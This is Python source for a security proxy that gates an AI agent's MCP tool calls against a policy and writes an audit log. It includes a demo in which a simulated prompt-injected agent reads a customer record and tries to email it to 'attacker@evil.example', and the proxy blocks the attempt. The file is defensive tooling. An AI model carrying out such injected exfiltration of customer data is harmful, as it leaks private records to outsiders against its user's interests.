import json
import os
import subprocess
import sys
import threading
from aegis_runtime.core import AegisRuntime, SecurityViolation


class AegisMCPProxy:
    def __init__(self, server_cmd, policy_path=None, audit_out="aegis_mcp_audit.json", telemetry_url=None, api_key=None):
        if not server_cmd:
            raise ValueError("server_cmd must contain at least one executable argument")
        self.server_cmd = list(server_cmd)
        self.audit_out = audit_out
        if policy_path and os.path.exists(policy_path):
            self.runtime = AegisRuntime.from_policy(
                policy_path,
                approval_handler=lambda tool, kwargs: False,
                telemetry_url=telemetry_url,
                api_key=api_key,
            )
        else:
            self.runtime = AegisRuntime(
                max_calls=25,
                approval_handler=lambda tool, kwargs: False,
                telemetry_url=telemetry_url,
                api_key=api_key,
            )
        self._guards = {}

    def _get_guard(self, tool_name):
        if tool_name not in self._guards:
            def _gate(**kwargs):
                return True
            _gate.__name__ = tool_name
            self._guards[tool_name] = self.runtime.guard()(_gate)
        return self._guards[tool_name]

    def evaluate_rpc_line(self, raw_line):
        line = raw_line.strip()
        if not line:
            return None, None
        try:
            msg = json.loads(line)
        except json.JSONDecodeError:
            return raw_line, None
        if not isinstance(msg, dict):
            return raw_line, None
        if msg.get("method") == "tools/call":
            params = msg.get("params") or {}
            tool_name = params.get("name", "unknown_tool")
            arguments = params.get("arguments") or {}
            if not isinstance(arguments, dict):
                arguments = {"_raw_args": arguments}
            gate = self._get_guard(tool_name)
            try:
                gate(**arguments)
            except SecurityViolation as exc:
                if "id" not in msg or msg["id"] is None:
                    return None, None
                err_resp = {
                    "jsonrpc": "2.0",
                    "id": msg["id"],
                    "error": {
                        "code": -32003,
                        "message": f"[AEGIS BLOCKED] {exc}",
                    },
                }
                return None, json.dumps(err_resp) + "\n"
        return raw_line if raw_line.endswith("\n") else raw_line + "\n", None

    def run(self, stdin=None, stdout=None, stderr=None):
        in_stream = stdin or sys.stdin
        out_stream = stdout or sys.stdout
        err_stream = stderr
        proc = subprocess.Popen(
            self.server_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=err_stream,
            text=True,
            encoding="utf-8",
            bufsize=1,
        )
        write_lock = threading.Lock()

        def _pump_server_stdout():
            assert proc.stdout is not None
            for line in proc.stdout:
                with write_lock:
                    out_stream.write(line)
                    out_stream.flush()

        reader_thread = threading.Thread(target=_pump_server_stdout, daemon=True)
        reader_thread.start()
        try:
            for line in in_stream:
                forward_line, immediate_error = self.evaluate_rpc_line(line)
                if immediate_error is not None:
                    with write_lock:
                        out_stream.write(immediate_error)
                        out_stream.flush()
                elif forward_line is not None and proc.stdin is not None:
                    proc.stdin.write(forward_line)
                    proc.stdin.flush()
        finally:
            if proc.stdin:
                try:
                    proc.stdin.close()
                except OSError:
                    pass
            proc.wait(timeout=5)
            reader_thread.join(timeout=2)
            if proc.stdout:
                try:
                    proc.stdout.close()
                except OSError:
                    pass
            if self.audit_out:
                self.runtime.export_audit_log(self.audit_out)
        return proc.returncode


def run_interactive_demo(audit_out="aegis_demo_audit.json"):
    policy = {
        "rules": {
            "read_customer_db": {"max_calls": 3},
            "send_external_email": {"forbid_after": ["read_customer_db"]},
        }
    }
    rt = AegisRuntime(policy=policy)

    @rt.guard()
    def read_customer_db(query):
        return [{"id": 101, "email": "alice@example.com", "ssn_last4": "8821"}]

    @rt.guard()
    def send_external_email(to, body):
        return f"Sent to {to}"

    print("[AEGIS DEMO] Simulating agent workflow with prompt-injection exfiltration...")
    rows = read_customer_db(query="SELECT * FROM customers LIMIT 1")
    print(f"[ALLOWED] read_customer_db - {len(rows)} sensitive record(s)")
    try:
        send_external_email(to="attacker@evil.example", body=str(rows))
        print("[ERROR] Exfiltration was not blocked!")
        return 1
    except SecurityViolation as exc:
        print(f"[BLOCKED] Causal exfiltration prevented: {exc}")
    rt.export_audit_log(audit_out)
    print(f"[AUDIT] SHA-256 hash-chained log written to {audit_out}")
    return 0
